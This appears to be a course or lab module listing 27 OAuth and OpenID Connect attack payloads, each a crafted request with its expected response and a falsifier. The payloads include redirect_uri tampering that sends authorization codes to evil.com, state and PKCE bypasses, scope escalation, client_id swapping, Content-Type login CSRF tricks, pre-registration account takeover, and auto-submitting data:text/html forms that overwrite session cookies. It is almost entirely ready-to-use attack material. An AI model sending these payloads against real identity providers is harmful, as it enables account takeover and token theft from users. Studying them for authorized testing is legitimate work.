# Payload dictionary deep — the OAuth request bodies, with the full mechanics

The payload-dictionary module names the request shapes. This module carries
the full mechanics — every request body, every parameter value, every
delivery mechanism, with the expected response and the falsifier.

## The authorize-request payloads

### Payload 1 — the standard authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE
```

Expected: `302` to `https://app/callback?code=ABC&state=STATE`.
Falsifier: `400` on `client_id`, `redirect_uri`, `response_type`, or `scope`.

### Payload 2 — the `state`-mismatched authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=DIFFERENT&scope=openid&nonce=NONCE
```

Expected: `302` to `https://app/callback?code=ABC&state=DIFFERENT` — the
`state` is echoed back, not validated. Falsifier: `400` on `state`.

### Payload 3 — the `redirect_uri`-mismatched authorize

```
GET /authorize?client_id=APP&redirect_uri=https://evil.com/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE
```

Expected: `302` to `https://evil.com/callback?code=ABC&state=STATE` — the
`redirect_uri` is not validated. Falsifier: `400` on `redirect_uri`.

### Payload 4 — the `redirect_uri`-prefix-mismatched authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app.evil.com/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE
```

Expected: `302` to `https://app.evil.com/callback?code=ABC&state=STATE` —
the `redirect_uri` is validated against a prefix. Falsifier: `400` on
`redirect_uri`.

### Payload 5 — the `redirect_uri`-subdomain-mismatched authorize

```
GET /authorize?client_id=APP&redirect_uri=https://sub.app/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE
```

Expected: `302` to `https://sub.app/callback?code=ABC&state=STATE` — the
`redirect_uri` is validated against a subdomain. Falsifier: `400` on
`redirect_uri`.

### Payload 6 — the `response_type=token` authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=token&state=STATE&scope=openid&nonce=NONCE
```

Expected: `302` to `https://app/callback#access_token=ABC&token_type=Bearer&
expires_in=3600` — the implicit flow is accepted. Falsifier: `400` on
`response_type`.

### Payload 7 — the `response_type=id_token` authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=id_token&state=STATE&scope=openid&nonce=NONCE
```

Expected: `302` to `https://app/callback#id_token=JWT&state=STATE` — the
implicit flow is accepted. Falsifier: `400` on `response_type`.

### Payload 8 — the `response_type=code token` authorize (hybrid)

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code%20token&state=STATE&scope=openid&nonce=NONCE
```

Expected: `302` to `https://app/callback#code=ABC&access_token=ABC&state=STATE` —
the hybrid flow is accepted. Falsifier: `400` on `response_type`.

### Payload 9 — the `response_mode=form_post` authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE&
    response_mode=form_post
```

Expected: `200` + a form that POSTs `code=ABC&state=STATE` to `https://app/callback` —
the code is delivered via `form_post`, not `query`. Falsifier: `400` on
`response_mode`.

### Payload 10 — the `response_mode=web_message` authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE&
    response_mode=web_message
```

Expected: `200` + a page that `postMessage`s `code=ABC&state=STATE` to the
target origin — the code is delivered via `web_message`, not `query`.
Falsifier: `400` on `response_mode`.

### Payload 11 — the `code_challenge` missing authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE
```

Expected: `302` to `https://app/callback?code=ABC&state=STATE` — PKCE is
not required. Falsifier: `400` on `code_challenge`.

### Payload 12 — the `code_challenge_method=plain` authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE&
    code_challenge=VERIFIER&code_challenge_method=plain
```

Expected: `302` to `https://app/callback?code=ABC&state=STATE` — the
`plain` method is accepted. Falsifier: `400` on `code_challenge_method`.

### Payload 13 — the `scope` broader authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=STATE&scope=openid%20profile%20admin&nonce=NONCE
```

Expected: `302` to `https://app/callback?code=ABC&state=STATE` — the
broader scope is accepted. Falsifier: `400` on `scope`.

### Payload 14 — the `scope=offline_access` authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=STATE&scope=openid%20offline_access&nonce=NONCE
```

Expected: `302` to `https://app/callback?code=ABC&state=STATE` — the
`offline_access` scope is accepted. Falsifier: `400` on `scope`.

### Payload 15 — the `prompt=none` authorize

```
GET /authorize?client_id=APP&redirect_uri=https://app/callback&
    response_type=code&state=STATE&scope=openid&nonce=NONCE&prompt=none
```

Expected: `302` to `https://app/callback?code=ABC&state=STATE` — the
`prompt=none` is accepted (silent re-auth). Falsifier: `400` on `prompt`.

## The token-exchange payloads

### Payload 16 — the standard exchange

```
POST /token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=ABC&client_id=APP&
client_secret=SECRET&redirect_uri=https://app/callback
```

Expected: `200` + `{"access_token": "AT", "token_type": "Bearer",
"expires_in": 3600}`. Falsifier: `400` on `code`, `client_id`,
`client_secret`, or `redirect_uri`.

### Payload 17 — the `redirect_uri`-mismatched exchange

```
POST /token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=ABC&client_id=APP&
client_secret=SECRET&redirect_uri=https://evil.com/callback
```

Expected: `200` + `{"access_token": "AT", ...}` — the `redirect_uri` is not
re-validated on exchange. Falsifier: `400` on `redirect_uri`.

### Payload 18 — the `code_verifier`-mismatched exchange

```
POST /token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=ABC&client_id=APP&
client_secret=SECRET&redirect_uri=https://app/callback&
code_verifier=WRONG
```

Expected: `200` + `{"access_token": "AT", ...}` — the `code_verifier` is
not re-validated. Falsifier: `400` on `code_verifier`.

### Payload 19 — the `code_verifier`-missing exchange

```
POST /token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=ABC&client_id=APP&
client_secret=SECRET&redirect_uri=https://app/callback
```

Expected: `200` + `{"access_token": "AT", ...}` — the `code_verifier` is
not required. Falsifier: `400` on `code_verifier`.

### Payload 20 — the `client_id`-mismatched exchange

```
POST /token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=ABC&client_id=B&
client_secret=SECRET_B&redirect_uri=https://app/callback
```

Expected: `200` + `{"access_token": "AT", ...}` — the `client_id` is not
bound to the code. Falsifier: `400` on `client_id`.

## The cookie-swap payloads

### Payload 21 — the `text/plain` JSON login

```
POST /api/login
Content-Type: text/plain

{"email":"student@domain","password":"own"}
```

Expected: `200` + `Set-Cookie: token=NEW_TOKEN` — the binder parses raw
JSON regardless of `Content-Type`. Falsifier: `400` on `Content-Type`.

### Payload 22 — the `application/x-www-form-urlencoded` JSON-name login

```
POST /api/login
Content-Type: application/x-www-form-urlencoded

{"email":"student@domain","password":"own"}=
```

Expected: `200` + `Set-Cookie: token=NEW_TOKEN` — the binder parses the
JSON-name trick. Falsifier: `400` on `Content-Type`.

### Payload 23 — the `multipart/form-data` JSON login

```
POST /api/login
Content-Type: multipart/form-data; boundary=BOUNDARY

--BOUNDARY
Content-Disposition: form-data; name="body"

{"email":"student@domain","password":"own"}
--BOUNDARY--
```

Expected: `200` + `Set-Cookie: token=NEW_TOKEN` — the binder parses the
multipart body. Falsifier: `400` on `Content-Type`.

## The registration payloads

### Payload 24 — the pre-registration race

```
POST /api/register
Content-Type: application/json

{"email":"student@domain","password":"own","username":"student"}
```

Expected: `200` + `{"status": "registered"}` — the account is registered
with the attacker's password. Falsifier: `409` on duplicate.

### Payload 25 — the pre-registration race (idempotent)

```
POST /api/register
Content-Type: application/json

{"email":"student@domain","password":"different","username":"student"}
```

Expected: `200` + `{"status": "registered", "account_id": "existing_id"}` —
the same account ID is returned. Falsifier: the registration is idempotent.

## The `data:text/html` delivery payloads

### Payload 26 — the `data:text/html` form

```
data:text/html,<form action="https://idp/api/login" method="POST"
  enctype="text/plain">
  <input name='{"email":"student@domain","password":"own","junk":"'
  value='"}'>
  <input type="submit">
</form>
<script>document.forms[0].submit()</script>
```

The form POSTs `{"email":"student@domain","password":"own","junk":""}` to
the IdP's `/api/login` — the `Set-Cookie` overwrites the shared jar's token.

### Payload 27 — the `data:text/html` iframe

```
data:text/html,<iframe src="https://idp/api/login?email=student@domain&
  password=own"></iframe>
```

The iframe GETs the IdP's `/api/login` — the `Set-Cookie` overwrites the
shared jar's token.
